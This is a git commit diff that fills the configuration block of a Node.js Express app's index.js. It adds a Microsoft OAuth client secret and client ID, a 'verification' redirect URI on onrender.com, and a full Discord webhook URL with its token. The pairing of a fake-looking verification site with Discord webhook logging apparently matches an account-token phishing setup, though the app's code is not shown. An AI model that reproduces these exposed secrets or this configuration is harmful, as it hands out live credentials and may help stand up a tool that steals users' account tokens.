ecc2cde4935eea082254a2c7f3fee077ff45f416
jit42069 <120136102+jit42069@users.noreply.github.com>
2022-12-08 16:04:26 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = 'Kfe8Q~xXblqOzOorA0vhHlkYK2fv7PiGMsp-Ob0k'
+const client_id = '62d2cbbb-cc7c-4ac8-b5e1-caafe1d57145'
+const redirect_uri = 'https://verification-6hnd.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1050517720589930627/fobrmoR9KbVBzkQMFPnxTvGbSlOLSVAuDjdTLF-olNZFmP_KItyOM_oazHHC_0zOT6ZK'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1050517720589930627/fobrmoR9KbVBzkQMFPnxTvGbSlOLSVAuDjdTLF-olNZFmP_KItyOM_oazHHC_0zOT6ZK'
 // Config end
 const axios = require('axios')
 const express = require('express')
